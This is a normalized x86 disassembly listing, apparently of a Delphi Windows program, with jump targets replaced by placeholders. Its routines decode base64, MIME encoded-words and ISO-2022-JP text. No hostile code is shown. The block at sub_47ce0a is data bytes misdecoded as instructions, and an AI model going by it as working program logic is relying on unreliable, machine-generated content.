mov eax [ eax + 0x7c ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
mov ebx [ eax ]
call [ ebx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cb23
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_47cb2c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
push ebp
push sub_47cb72
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cb79
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
retn
sub_47cb80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47b1b8
xor eax eax
mov [ esi + 0xbc ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47cbc0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47b29c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47cc28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47cc4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cc54
retn
sub_47cc60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47cc85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cc8c
retn
sub_47ce0a
inc edi
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x46 ] ah
inc edi
add ah bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edi + ecx * 8 ] bl
inc edi
add [ eax ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ eax ] bh
mov bl 0x47
add [ eax ] ch
mov edx 0xaebc0047
inc edi
add [ eax + esi * 4 - 0x3e2bffb9 ] bh
inc edi
add [ ebx + eax * 8 - 0x4e6fffb9 ] ah
inc edi
add [ eax ] al
mov bl 0x47
add [ eax ] dl
rol [ edi ] 0x58
mov bl 0x47
add al ah
mov bl 0x47
add [ eax - 0x4fffb84d ] al
mov ah 0x47
add [ edi + esi * 4 + 0x47 ] bl
add [ edx + edi * 4 ] bh
inc edi
add [ eax ] al
mov ebx 0xbe9c0047
inc edi
add ah bh
mov esi 0xbd340047
inc edi
add [ eax ] cl
int3
sub_47cf60
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41964c
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ee0
mov esi eax
mov [ ebx + 0x24 ] esi
mov eax esi
xor edx edx
call sub_41b444
mov eax [ ebx + 0x24 ]
mov [ eax + 0x1d ] 0x1
mov [ eax + 0x35 ] 0x0
mov [ eax + 0x36 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x28 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ee0
mov [ ebx + 0x34 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41964c
mov [ ebx + 0x38 ] eax
mov eax [ ebx + 0x30 ]
xor edx edx
call sub_41b444
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47d010
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x38 ]
call sub_40d814
lea eax [ esi + 0x34 ]
call sub_40d814
lea eax [ esi + 0x30 ]
call sub_40d814
lea eax [ esi + 0x24 ]
call sub_40d814
lea eax [ esi + 0x28 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419684
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47d094
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi eax
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
xor eax eax
push ebp
push sub_47d12e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ ebx ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx ]
jle r-xdata
dec [ ebx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d135
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40413c
retn
lea ecx [ ebp - 0xc ]
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x20
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_4082d0
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebx ]
sub_47d13c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
lea ebx [ ebp - 0x8 ]
lea esi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_47d23a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ esi ]
jg r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x24 ]
mov edx [ esi ]
mov edi [ eax ]
call [ edi + 0xc ]
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_408064
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4041b0
push 0x1
mov edx rw-data
mov ecx 0x2
mov eax [ ebp - 0xc ]
call sub_4742ec
sub eax 0x1
jb r-xdata
lea ecx [ ebp - 0x18 ]
mov eax [ ebx ]
mov eax [ eax + 0x24 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x18 ]
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
call sub_476ed0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d241
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40413c
retn
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x28 ]
call sub_47d094
pop ecx
jmp r-xdata
je r-xdata
inc [ esi ]
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x30 ]
call sub_47d094
pop ecx
jmp r-xdata
dec eax
je r-xdata
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x34 ]
call sub_47d094
pop ecx
jmp r-xdata
sub_47d263
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_47d2a0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d2a7
mov eax rw-data
mov ecx 0x3
mov edx [ r-xdata ]
call sub_404bb4
sub_47d2f4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov esi eax
mov eax [ ebp + 0xc ]
call sub_4045c8
xor eax eax
push ebp
push sub_47d45c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea edx [ ebp - 0x28 ]
xor ecx ecx
mov eax r-xdata
call sub_409280
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
call sub_4043d8
mov edi eax
test edi edi
jle r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov ebx 0x1
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041b0
mov eax [ esi + 0x10 ]
call sub_4043d8
mov edi eax
test edi edi
jle r-xdata
mov al [ ebp - 0x2 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx rw-data
mov eax [ esi + 0x10 ]
call sub_47e4bc
jmp r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
cmp al 0x7f
jb r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043e0
mov ebx 0x1
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ esi + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_409280
jmp r-xdata
inc ebx
dec edi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d463
lea eax [ ebp - 0x10 ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_404118
lea eax [ ebp + 0xc ]
call sub_404118
retn
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043e0
mov eax [ esi + 0x10 ]
cmp [ eax + ebx - 0x1 ] 0x22
jne r-xdata
mov eax [ esi + 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al 0x20
jb r-xdata
mov eax [ esi + 0x10 ]
cmp [ eax + ebx - 0x1 ] 0x5c
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ esi + 0x10 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
call sub_4043e0
inc ebx
dec edi
jne r-xdata
sub_47d4b8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_47d59f
push [ fs : edx ]
mov [ fs : edx ] esp
test esi esi
jne r-xdata
test al al
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4043d8
mov ecx eax
mov edx esi
mov eax ebx
call sub_404638
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_40471c
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4043d8
mov ecx eax
mov edx esi
mov eax ebx
call sub_404638
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4081a4
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_4081a4
mov eax [ ebp - 0x14 ]
pop edx
call sub_40471c
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40471c
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4081a4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_4081a4
mov eax [ ebp - 0x8 ]
pop edx
call sub_40471c
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d5a6
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_40413c
retn
add ebx esi
dec ebx
test ebx ebx
jle r-xdata
sub_47d5b4
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_47dabf
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0x2c ]
mov ecx 0x1
mov eax r-xdata
call sub_47d4b8
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
push 0x0
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0x30 ]
mov ecx 0x1
mov eax r-xdata
call sub_47d4b8
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40471c
test eax eax
jg r-xdata
mov [ ebp - 0x25 ] 0x1
push 0x0
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0x34 ]
lea ecx [ ebx + 0x5 ]
mov eax r-xdata
call sub_47d4b8
mov edi eax
test edi edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40471c
mov edx eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
call sub_404678
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dac6
lea eax [ ebp - 0x74 ]
mov edx 0x8
call sub_40413c
lea eax [ ebp - 0x48 ]
mov edx 0x8
call sub_40413c
lea eax [ ebp - 0x24 ]
call sub_404118
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov [ ebp - 0x25 ] 0x0
cmp [ ebp - 0x25 ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0x38 ]
lea ecx [ edi + 0x1 ]
mov eax r-xdata
call sub_47d4b8
mov edi eax
test edi edi
jne r-xdata
push 0x0
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0x70 ]
lea ecx [ ebx + 0x1 ]
mov eax r-xdata
call sub_47d4b8
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0x3c ]
lea ecx [ edi + 0x1 ]
mov eax r-xdata
call sub_47d4b8
mov edi eax
test edi edi
jle r-xdata
mov [ ebp - 0x25 ] 0x0
test ebx ebx
jg r-xdata
push 0x0
lea edx [ ebp - 0x74 ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0x74 ]
lea ecx [ ebx + 0x1 ]
mov eax r-xdata
call sub_47d4b8
mov ebx eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
sub ecx ebx
add ecx 0x2
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404638
mov esi 0x1
jmp r-xdata
cmp esi 0x2
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_40471c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x24 ]
call sub_404638
jmp r-xdata
inc esi
cmp esi 0x4
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x24 ]
call sub_404638
mov edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_40471c
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_4043d8
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov edx [ ebp - 0xc ]
inc edx
mov eax [ ebp - 0x24 ]
call sub_404638
cmp esi 0x1
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_4043d8
mov edx eax
dec edx
mov ecx 0x2
mov eax [ ebp - 0x24 ]
call sub_404638
mov eax [ ebp - 0x40 ]
mov edx r-xdata
call sub_404524
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_408248
test al al
je r-xdata
mov [ ebp - 0x25 ] 0x0
cmp [ ebp - 0x25 ] 0x0
je r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
jmp r-xdata
mov esi 0x1
lea eax [ ebp - 0x18 ]
call sub_404118
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_408248
test al al
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_4043d8
cmp eax 0x4
jge r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x3d
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4043e0
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
call sub_4041b0
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_47db48
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov al [ eax ]
call sub_47d4a0
mov [ ebp - 0x1f ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x1 ]
call sub_47d4a0
mov [ ebp - 0x1e ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x2 ]
call sub_47d4a0
mov [ ebp - 0x1d ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x3 ]
call sub_47d4a0
mov [ ebp - 0x1c ] al
mov dl [ ebp - 0x1f ]
shl edx 0x2
mov al [ ebp - 0x1e ]
xor ecx ecx
mov cl al
shr ecx 0x4
or dl cl
mov [ ebp - 0x1b ] dl
shl eax 0x4
xor edx edx
mov dl [ ebp - 0x1d ]
shr edx 0x2
or al dl
mov [ ebp - 0x1a ] al
mov al [ ebp - 0x1d ]
shl eax 0x6
xor edx edx
mov dl [ ebp - 0x1c ]
shr edx 0x0
or al dl
mov [ ebp - 0x19 ] al
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_4043d8
mov ecx eax
mov edx 0x5
mov eax [ ebp - 0x24 ]
call sub_404638
push [ ebp - 0x18 ]
lea eax [ ebp - 0x5c ]
mov dl [ ebp - 0x1b ]
call sub_404300
push [ ebp - 0x5c ]
lea eax [ ebp - 0x60 ]
mov dl [ ebp - 0x1a ]
call sub_404300
push [ ebp - 0x60 ]
lea eax [ ebp - 0x64 ]
mov dl [ ebp - 0x19 ]
call sub_404300
push [ ebp - 0x64 ]
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404498
lea eax [ ebp - 0x58 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi - 0x1 ]
call sub_404300
mov edx [ ebp - 0x58 ]
lea eax [ ebp - 0x18 ]
call sub_4043e0
mov eax [ ebp - 0x24 ]
call sub_4043d8
lea edx [ esi + 0x4 ]
cmp eax edx
jl r-xdata
inc esi
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x3f
jne r-xdata
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
push [ ebp - 0x68 ]
push [ ebp - 0x24 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
lea edx [ edi + 0x2 ]
mov eax [ ebp - 0x4 ]
call sub_404638
push [ ebp - 0x6c ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404498
lea eax [ ebp - 0x24 ]
call sub_404118
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x5f
jne r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + esi ] 0x3d
jne r-xdata
mov edx r-xdata
lea eax [ ebp - 0x4c ]
call sub_402be4
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x50 ]
lea eax [ ebp - 0x4c ]
mov cl 0x2
call sub_402bb4
lea edx [ ebp - 0x4c ]
lea eax [ ebp - 0x54 ]
call sub_402be4
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi + 0x1 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x50 ]
lea eax [ ebp - 0x54 ]
mov cl 0x3
call sub_402bb4
lea edx [ ebp - 0x54 ]
lea eax [ ebp - 0x48 ]
call sub_40437c
mov eax [ ebp - 0x48 ]
call sub_408648
mov edx eax
lea eax [ ebp - 0x44 ]
call sub_404300
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0x18 ]
call sub_4043e0
add esi 0x2
jmp r-xdata
jmp r-xdata
sub_47db48
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47dccc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_404118
mov [ ebp - 0x9 ] 0x0
mov eax esi
call sub_4043d8
mov edi eax
mov ebx 0x1
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dcd3
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_40413c
lea eax [ ebp - 0x8 ]
call sub_404118
retn
cmp [ esi + ebx - 0x1 ] 0x1b
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc ebx
lea eax [ ebx + 0x1 ]
cmp edi eax
jl r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404300
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x8 ]
call sub_4043e0
inc ebx
lea eax [ ebx + 0x1 ]
cmp edi eax
jl r-xdata
cmp edi ebx
jge r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx ebx
mov eax esi
call sub_404638
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404524
jne r-xdata
inc ebx
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
mov dl [ esi + ebx ]
mov [ ebp - 0xa ] dl
xor edx edx
mov dl al
dec edx
shr edx 0x1
mov [ ebp - 0xb ] dl
cmp al 0x5f
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x2
mov edx ebx
mov eax esi
call sub_404638
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404524
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
add [ ebp - 0xb ] 0xb1
add [ ebp - 0xb ] 0x71
jmp r-xdata
add ebx 0x2
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
add [ ebp - 0xa ] 0x7e
cmp [ ebp - 0xa ] 0x60
jae r-xdata
and eax 0xff
and eax 0x1
cmp eax 0x1
jne r-xdata
add [ ebp - 0xa ] 0x20
jmp r-xdata
add [ ebp - 0xa ] 0x1f
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
mov dl [ ebp - 0xb ]
call sub_404300
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0xa ]
call sub_404300
push [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404498
add ebx 0x2
jmp r-xdata
sub_47dcf4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebx ] 0x1
mov [ esi ] 0x42
call sub_473ff8
sub al 0x1
jb r-xdata
mov eax edi
mov edx r-xdata
call sub_40416c
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx r-xdata
call sub_40416c
jmp r-xdata
dec al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40416c
mov [ ebx ] 0x2
jmp r-xdata
dec al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40416c
jmp r-xdata
jmp r-xdata
mov eax edi
mov edx r-xdata
call sub_40416c
mov [ esi ] 0x51
sub_47ddc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov edi eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_4045c8
xor eax eax
push ebp
push sub_47de67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404118
xor ebx ebx
jmp r-xdata
mov eax edi
call sub_419a38
cmp ebx eax
jl r-xdata
push [ esi ]
push r-xdata
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov edx ebx
mov eax edi
call sub_477624
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
call sub_47d2f4
push [ ebp - 0x8 ]
mov eax esi
mov edx 0x3
call sub_404498
inc ebx
mov eax esi
mov ecx 0x2
mov edx 0x1
call sub_404678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47de6e
lea eax [ ebp - 0x8 ]
call sub_404118
lea eax [ ebp + 0xc ]
call sub_404118
retn
sub_47de84
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47e099
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_404118
mov [ ebp - 0xd ] 0x0
mov eax esi
call sub_4043d8
mov [ ebp - 0xc ] eax
mov edi 0x1
cmp edi [ ebp - 0xc ]
jg r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov bl [ esi + edi - 0x1 ]
cmp bl 0x80
jae r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e0a0
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_40413c
lea eax [ ebp - 0x8 ]
call sub_404118
retn
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043e0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
mov eax ebx
sub al 0x1
jb r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
inc edi
jmp r-xdata
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_404300
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_4043e0
inc edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043e0
mov [ ebp - 0xd ] 0x0
cmp edi [ ebp - 0xc ]
jle r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
dec al
je r-xdata
xor eax eax
mov al [ esi + edi - 0x1 ]
mov ax [ eax * 2 + rw-data ]
mov [ ebp - 0x10 ] ax
cmp edi [ ebp - 0xc ]
jge r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043e0
mov [ ebp - 0xd ] 0x1
add edi 0x2
jmp r-xdata
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
movzx edx [ ebp - 0x10 ]
